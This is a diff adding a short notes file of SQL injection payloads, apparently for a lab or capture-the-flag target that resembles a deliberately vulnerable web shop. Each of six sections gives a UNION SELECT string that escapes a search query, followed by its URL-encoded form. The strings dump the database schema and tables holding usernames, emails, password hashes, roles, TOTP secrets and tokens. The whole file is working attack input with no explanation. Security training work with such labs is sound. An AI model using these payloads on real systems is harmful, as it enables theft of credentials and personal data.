@@ -1,0 +1,28 @@
+DB schemas:
+axs%')) UNION SELECT name,tbl_name ,rootpage ,type,sql ,'a','a','a','a' FROM sqlite_schema;--
+=> axs%25%27%29%29%20UNION%20SELECT%20name%2Ctbl_name%20%2Crootpage%20%2Ctype%2Csql%20%2C%27a%27%2C%27a%27%2C%27a%27%2C%27a%27%20FROM%20sqlite_schema%3B--%0A
+
+
+Users:
+axs%')) UNION SELECT id, username, email, password, role, deluxeToken, lastLoginIp, totpSecret, isActive FROM Users;--
+=> axs%25%27%29%29%20UNION%20SELECT%20id%2C%20username%2C%20email%2C%20password%2C%20role%2C%20deluxeToken%2C%20lastLoginIp%2C%20totpSecret%2C%20isActive%20FROM%20Users%3B--%0A
+
+
+Products:
+axs%')) UNION SELECT id,name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt FROM Products;--
+=> axs%25%27%29%29%20UNION%20SELECT%20id%2Cname%2C%20description%2C%20price%2C%20deluxePrice%2C%20image%2C%20createdAt%2C%20updatedAt%2C%20deletedAt%20FROM%20Products%3B--%0A
+
+
+Feedback:
+axs%')) UNION SELECT UserId, id, comment, rating, createdAt, updatedAt, 'a', 'a', 'a' FROM Feedbacks;--
+=> axs%25%27%29%29%20UNION%20SELECT%20UserId%2C%20id%2C%20comment%2C%20rating%2C%20createdAt%2C%20updatedAt%2C%20%27a%27%2C%20%27a%27%2C%20%27a%27%20FROM%20Feedbacks%3B--%0A
+
+
+Complaints:
+axs%')) UNION SELECT UserId, id, message, file, createdAt, updatedAt, 'a', 'a', 'a' FROM Complaints;--
+=> axs%25%27%29%29%20UNION%20SELECT%20UserId%2C%20id%2C%20message%2C%20file%2C%20createdAt%2C%20updatedAt%2C%20%27a%27%2C%20%27a%27%2C%20%27a%27%20FROM%20Complaints%3B--
+
+
+Memories:
+axs%')) UNION SELECT UserId, id, caption, imagePath, createdAt, 'updatedAt', 'a', 'a', 'a' FROM Memories;--
+=> axs%25%27%29%29%20UNION%20SELECT%20UserId%2C%20id%2C%20caption%2C%20imagePath%2C%20createdAt%2C%20%27updatedAt%27%2C%20%27a%27%2C%20%27a%27%2C%20%27a%27%20FROM%20Memories%3B--%0A
